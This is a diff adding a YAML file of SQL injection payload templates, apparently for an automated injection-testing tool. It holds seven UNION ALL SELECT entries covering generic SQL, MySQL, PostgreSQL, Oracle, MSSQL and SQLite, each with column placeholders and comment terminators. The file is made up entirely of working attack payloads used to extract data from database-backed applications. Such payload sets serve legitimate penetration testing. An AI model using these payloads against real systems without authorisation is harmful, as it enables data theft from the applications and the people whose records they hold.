@@ -1,0 +1,79 @@
+# Union-query payloads.
+# stype 3 = union.
+payloads:
+  - title: "Generic UNION query (NULL) - 1 to 10 columns"
+    stype: 3
+    level: 1
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]"
+    request:
+      payload: "UNION ALL SELECT NULL[COLUMNS]"
+    response:
+      union: "[GENERIC_SQL_COMMENT]"
+
+  - title: "Generic UNION query (random number) - 1 to 10 columns"
+    stype: 3
+    level: 2
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]"
+    request:
+      payload: "UNION ALL SELECT [RANDNUM][COLUMNS]"
+
+  - title: "MySQL UNION query (NULL) - 1 to 10 columns (no quotes)"
+    stype: 3
+    level: 2
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY]-- -"
+    request:
+      payload: "UNION ALL SELECT NULL[COLUMNS]-- -"
+    dbms: ["mysql", "mariadb", "percona", "tidb", "singlestore"]
+
+  - title: "PostgreSQL UNION query (NULL) - 1 to 10 columns (CAST)"
+    stype: 3
+    level: 2
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY]-- -"
+    request:
+      payload: "UNION ALL SELECT CAST(NULL AS TEXT)[COLUMNS]-- -"
+    dbms: ["postgresql", "greenplum", "redshift", "cockroachdb", "yugabyte", "alloydb", "opengauss"]
+
+  - title: "Oracle UNION query (NULL) with DUAL"
+    stype: 3
+    level: 2
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY] FROM DUAL-- -"
+    request:
+      payload: "UNION ALL SELECT NULL[COLUMNS] FROM DUAL-- -"
+    dbms: ["oracle"]
+
+  - title: "MSSQL UNION query (NULL)"
+    stype: 3
+    level: 2
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY]-- -"
+    request:
+      payload: "UNION ALL SELECT NULL[COLUMNS]-- -"
+    dbms: ["mssql"]
+
+  - title: "SQLite UNION query (NULL)"
+    stype: 3
+    level: 2
+    risk: 1
+    clause: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    where: 2
+    vector: "UNION ALL SELECT [QUERY]-- -"
+    request:
+      payload: "UNION ALL SELECT NULL[COLUMNS]-- -"
+    dbms: ["sqlite"]
